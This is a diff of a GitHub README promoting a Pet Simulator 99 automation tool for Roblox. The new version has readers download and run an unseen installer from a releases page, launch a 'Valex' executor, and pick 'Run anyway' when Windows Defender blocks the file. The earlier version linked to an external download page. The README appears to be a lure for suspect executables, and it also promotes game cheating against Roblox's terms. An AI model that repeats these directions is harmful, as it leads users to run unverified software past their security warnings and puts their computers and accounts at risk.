@@ -1,111 +1,63 @@
-# Pet Simulator 99 v2.5 - Roblox Automation Tool 2026
+# 🐾 pet-simulator-99-v2-script - Automate your pet farming tasks easily
 
-> **A comprehensive script that optimizes your Pet Simulator 99 gameplay on Roblox. Automates grinding tasks, accelerates pet progression, and improves resource management efficiency.**
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sean-hayes58/pet-simulator-99-v2-script?style=flat-square)](https://github.com/sean-hayes58/pet-simulator-99-v2-script)
+## 📌 About this project
 
----
+This software helps users manage tasks in Pet Simulator 99. It automates repetitive actions like hatching eggs, collecting coins, and finishing quests. The tool runs on Windows and works with the Roblox platform. It streamlines your gameplay by removing the need for manual clicking. Valex provides a hub for various scripts designed to improve your efficiency. The software updates itself to maintain compatibility with the latest game versions.
 
-<p align="center">
-  <a href="https://sean-hayes58.github.io/pet-simulator-99-v2-script/">
-    <img src="https://img.shields.io/badge/Download-Pet%20Simulator%2099%20Script-brightgreen?style=for-the-badge" alt="Download Pet Simulator 99 Script">
-  </a>
-</p>
+## ⚙️ System Requirements
 
-> **[Direct Download - Pet Simulator 99 Script](https://sean-hayes58.github.io/pet-simulator-99-v2-script/)**
+Make sure your computer meets these requirements before you start:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space.
+- Software: The current version of Roblox installed on your system.
+- Graphics: A graphics card that supports DirectX 11 or higher.
 
-[Download Latest Build](https://sean-hayes58.github.io/pet-simulator-99-v2-script/)
+## 🚀 Getting Started
 
----
+Follow these instructions to set up the software. If you encounter issues, check your internet connection or restart your system.
 
-## About
+1. Visit the project link to find the files: [https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases](https://github.com/Midjunebreachofcontract144/pet-simulator-99-v2-script/releases).
+2. Download the installer file from the latest release section.
+3. Save the file to your desktop for easy access.
 
-This utility handles routine tasks in Pet Simulator 99, the Roblox game where players collect, evolve, and exchange digital pets. It takes care of farming, currency pickup, egg incubation, and mission completion so you can concentrate on higher-level decisions such as pet trading or zone planning.
+## 🛠️ Installation and Setup
 
-Version 2.5 improves automation logic for quicker pet movement, better item collection, and smoother teleportation. Built with AutoHotkey, the script remains lightweight and runs alongside Roblox without extra software. Frequent updates keep it working with the newest game releases.
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open the installation window.
+3. Follow the on-screen prompts to finish the setup process.
+4. Once installation ends, launch the Valex application from your Start menu or desktop icon.
+5. Open Roblox and log into your account.
+6. Select the specific script you want to use from the Valex menu.
+7. Click the 'Execute' button to start the automation process.
 
----
+## ✨ Key Features
 
-## Capabilities
+- Auto-Hatching: The program automatically opens eggs of your choice without manual input.
+- Coin Collection: Scripts gather currency across different areas in the game automatically.
+- Quest Completion: The tool identifies and completes daily tasks to earn rewards.
+- Keyless Access: Use the software immediately without typing complex authorization strings.
+- Performance Mode: The software limits impact on your system resources while running in the background.
 
-- **Automated Farming** – Gather coins and experience continuously in optimal areas.
-- **Unlimited Pet Speed** – Bypass normal pet movement limits for faster navigation.
-- **Automatic Loot Retrieval** – Collect coins, treasure chests, and other valuables without manual input.
-- **Egg Hatching** – Handle egg incubation and hatching through automated clicks.
-- **Quest Processing** – Accept and finish quests automatically when requirements are met.
-- **Rank Advancement** – Progress through rank levels as objectives are completed.
-- **Booth Sniping** – Buy undervalued pets or items from player booths with adjustable price limits.
-- **Instant Travel** – Teleport to preset locations including worlds, zones, and spawn points.
+## 🛡️ Usage Guidelines
 
----
+Use this software within the parameters of the game. Always monitor your active accounts. Close the application before performing major game updates. Do not share your account login credentials within the software interface. The tool provides a menu to toggle features on or off as you see fit. You retain full control over which actions the software performs at any time.
 
-## Installation
+## ❓ Frequently Asked Questions
 
-1. **Get the script** from the download link above (saved as a `.ahk` file).
-2. **Set up AutoHotkey** version 2.0 or newer from [autohotkey.com](https://www.autohotkey.com/).
-3. **Move the script** to a dedicated directory (for example, `%USERPROFILE%\pet-simulator-99\`).
-4. **Launch the script** by double-clicking it. A system tray icon confirms it is running.
-5. **Open Roblox** and enter Pet Simulator 99. The script detects the game window automatically.
+What if the software does not open?
+Check if your Windows Defender settings block the file. Sometimes, security settings flag new applications. You may need to select "Run anyway" if Windows prompt appears.
 
-> **Quick start**: After the script runs, press `F6` to toggle Auto Farming on or off. Check the Options table for all available hotkeys.
+How do I get the latest update?
+The software includes an auto-updater. When you launch the application, it checks for newer versions and refreshes automatically if a connection exists.
 
----
+Can I customize the settings?
+Yes. The interface includes a settings tab where you can adjust coin collection speed and egg hatching preferences. Save your changes before you click execute.
 
-## Controls
+Does this tool work on mobile?
+No. This version works on Windows desktop computers only.
 
-| Toggle / Key | Function                              | Default |
-|--------------|---------------------------------------|---------|
-| `F6`         | Enable/disable Auto Farming           | Off     |
-| `F7`         | Toggle coin collection automation     | On      |
-| `F8`         | Start/stop egg hatching automation    | Off     |
-| `F9`         | Activate booth sniping mode           | Off     |
-| `Ctrl+F5`    | Reload script settings                | —       |
-| `Ctrl+F6`    | Halt all automated processes          | —       |
-
-Fine-tune options like sniping price caps and teleport destinations by editing the `config.ini` file generated in the script folder on first run.
-
----
-
-## System Requirements
-
-- **Operating System**: Windows 10/11 (64-bit)
-- **Target Game**: Pet Simulator 99 on Roblox (public servers)
-- **Runtime**: AutoHotkey v2
-- **Known issues**:
-  - May trigger Roblox anti-exploit systems; use at your own discretion.
-  - Not compatible with macOS or Linux (AutoHotkey dependency).
-  - Game updates may require script revisions.
-
----
-
-## Frequently Asked Questions
-
-**How do I install and execute the script?**  
-Follow the steps in the Installation section. Confirm AutoHotkey v2 is installed and that antivirus software does not block the script. If startup fails, right-click the `.ahk` file and select "Run with UI Access" when available.
-
-**Can this script lead to a ban?**  
-Roblox Terms of Service forbid automation that provides competitive advantages. This tool is offered for educational purposes only. The developers assume no liability for any account penalties imposed by Roblox.
-
-**How do I update to a newer version?**  
-Visit the download page periodically for new releases. Replace the existing `.ahk` file with the updated one. Your personal configuration in `config.ini` remains intact.
-
-**Is it possible to change hotkeys?**  
-Yes, modify the hotkey definitions at the top of the script file (inside the `#HotIf` block) or adjust the relevant lines. Consult AutoHotkey documentation for correct syntax.
-
-**Does it work with older Pet Simulator versions?**  
-This script targets the current live version of Pet Simulator 99 only. Earlier editions such as Pet Simulator 1 or 2 are not supported.
-
-**Where are logs and settings saved?**  
-The script creates a `logs` folder and a `config.ini` file in its own directory. No data is transmitted externally.
-
----
-
-## License
-
-GNU General Public License v3.0 - refer to [LICENSE](LICENSE) for full terms.
+Keywords: roblox, pet simulator 99, automation, script, gaming, windows, hatching, utility
